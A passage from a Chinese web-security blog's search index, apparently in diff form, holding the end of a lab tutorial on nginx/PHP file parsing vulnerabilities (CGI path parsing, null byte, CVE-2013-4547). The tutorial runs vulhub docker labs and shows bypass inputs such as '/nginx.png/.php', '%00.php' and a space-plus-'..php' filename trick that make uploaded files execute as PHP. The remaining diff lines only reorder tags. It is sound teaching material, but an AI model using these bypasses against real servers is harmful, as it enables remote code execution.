CGI解析漏洞</h3><p>原理同IIS + PHP CGI解析漏洞</p><blockquote><h4 id="EX：nginx-PHP-CGI解析漏洞"><a href="#EX：nginx-PHP-CGI解析漏洞" class="headerlink" title="EX：nginx +  PHP CGI解析漏洞"></a>EX：nginx +  PHP CGI解析漏洞</h4><p>1、漏洞平台</p><p>ubuntu 20.04 192.168.33.6</p><p>vulhub-master/</p><p>2、漏洞测试</p><p>启动docker 环境 </p><p>进入vulhub-master目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> nginx/nginx_parsing_vulnerability/<span class="token function">sudo</span> <span class="token function">docker-compose</span> build<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>继续：</p><p>sudo docker-compose up -d ✅</p><p>访问：</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.04.04.png" style="zoom:75%;"><p>漏洞测试：</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.05.16.png" style="zoom:35%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.05.42.png" style="zoom:35%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.6/uploadfiles/nginx.png/.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>漏洞成因。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.06.29.png" style="zoom:75%;"></blockquote><h3 id="3-4-2-nginx空字节漏洞"><a href="#3-4-2-nginx空字节漏洞" class="headerlink" title="3.4.2 nginx空字节漏洞"></a>3.4.2 nginx空字节漏洞</h3><p>将info.php 重命名为info.html</p><p>访问后者，不能执行。但是后面 +%00.php 之后却可以解析执行。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%888.13.07.png" style="zoom:45%;"><p>原理：</p><ul><li><p>读取整个URL之后，发现结尾是.php，移交给PHP解释进程来解析。</p></li><li><p>PHP解析进程从前往后看，到html为止，后面相当于null，解析执行。</p></li></ul><h3 id="3-4-3-nginx文件名逻辑漏洞（CVE-2013-4547-）"><a href="#3-4-3-nginx文件名逻辑漏洞（CVE-2013-4547-）" class="headerlink" title="3.4.3 nginx文件名逻辑漏洞（CVE**-2013-4547**）"></a>3.4.3 nginx<strong>文件名逻辑漏洞（</strong>CVE**-2013-4547**）</h3><blockquote><h4 id="EX：nginx-文件名逻辑漏洞"><a href="#EX：nginx-文件名逻辑漏洞" class="headerlink" title="EX：nginx 文件名逻辑漏洞"></a>EX：nginx 文件名逻辑漏洞</h4><p>1、启动环境</p><p>先关闭之前启动的环境：</p><p>sudo docker-compose down</p><p>进入相应目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> CVE-2013-4547<span class="token function">sudo</span> <span class="token function">docker-compose</span> build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2、访问8080端口测试</p><p>上传info.php，抓包。</p><p>传info.php 上传失败：Unsupported filetype uploaded.</p><p>文件名后缀改成 png 上传成功：File uploaded successfully: /var/www/html/uploadfiles/phpinfo.png</p><p><strong>关键步骤一：逻辑漏洞 文件名后面+一个空格</strong></p><p>访问的时候抓包。</p><p>【新方法：将请求的URL复制到剪贴板 repeater模块,开一个标签，右键，粘贴URL作为请求】</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.08.17.png" style="zoom:45%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.12.28.png" style="zoom:35%;"><p>关键步骤二：访问的请求中URL info.php ..php</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.12.48.png" style="zoom:75%;"><p>关键步骤三：打开 请求的十六进制形式，</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2025-02-10%2017.30.32.png" style="zoom:50%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.14.08.png" style="zoom:75%;"><p>请求之后，目标PHP代码被解析执行。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8B%E5%8D%889.16.58.png" style="zoom:45%;"></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件解析漏洞是Web安全中的一种漏洞，当应用程序在处理文件时，未能正确解析文件内容或格式，攻击者可利用此漏洞上传或提交恶意构造的文件，导致应用程序执行未授权操作，如远程代码执行、信息泄露或拒绝服务攻击。这种漏洞通常源于对文件扩展名、内容类型验证不足，或文件名路径过滤不严，以及文件内容解析逻辑存在缺陷。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+            <tag> 漏洞知识库 </tag>
+            
+            <tag> 文件解析漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>文件包含漏洞</title>
       <link href="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/"/>
       <url>/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/</url>
@@ -21,6 +81,8 @@
         <tags>
             
             <tag> web安全 </tag>
+            
+            <tag> 漏洞知识库 </tag>
             
             <tag> 文件包含 </tag>
             
@@ -47,9 +109,9 @@
       
         <tags>
             
-            <tag> 跨站脚本攻击 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> 跨站脚本攻击 </tag>
             
             <tag> xss-labs </tag>
             
@@ -78,9 +140,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> XSS </tag>
-            
             <tag> 跨站脚本攻击 </tag>
+            
+            <tag> XSS </tag>
             
         </tags>
       
@@ -105,11 +167,11 @@
       
         <tags>
             
+            <tag> web安全 </tag>
+            
             <tag> 文件上传 </tag>
             
             <tag> upload-labs </tag>
-            
-            <tag> web安全 </tag>
             
         </tags>
       
@@ -136,9 +198,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 文件上传漏洞 </tag>
-            
             <tag> 二次渲染绕过 </tag>
+            
+            <tag> 文件上传漏洞 </tag>
             
         </tags>
       
@@ -399,13 +461,13 @@
       
         <tags>
             
-            <tag> 攻防工具库 </tag>
-            
             <tag> webshell管理 </tag>
             
             <tag> 哥斯拉 </tag>
             
             <tag> Godzilla </tag>
+            
+            <tag> 攻防工具库 </tag>
             
         </tags>
       
@@ -960,11 +1022,11 @@
       
         <tags>
             
+            <tag> 内网攻防 </tag>
+            
             <tag> FRP </tag>
             
             <tag> FRP内网穿透 </tag>
-            
-            <tag> 内网攻防 </tag>
             
         </tags>
       
@@ -1323,11 +1385,11 @@
       
         <tags>
             
-            <tag> 密码学算法安全 </tag>
-            
             <tag> padding oracle攻击 </tag>
             
             <tag> web安全中的密码学攻击 </tag>
+            
+            <tag> 密码学算法安全 </tag>
             
         </tags>
       
@@ -1418,6 +1480,8 @@
             
             <tag> web安全 </tag>
             
+            <tag> 漏洞知识库 </tag>
+            
             <tag> 文件上传漏洞 </tag>
             
             <tag> 基础知识库 </tag>
@@ -1479,6 +1543,8 @@
             <tag> web安全 </tag>
             
             <tag> sql注入基础 </tag>
+            
+            <tag> 漏洞知识库 </tag>
             
         </tags>
       
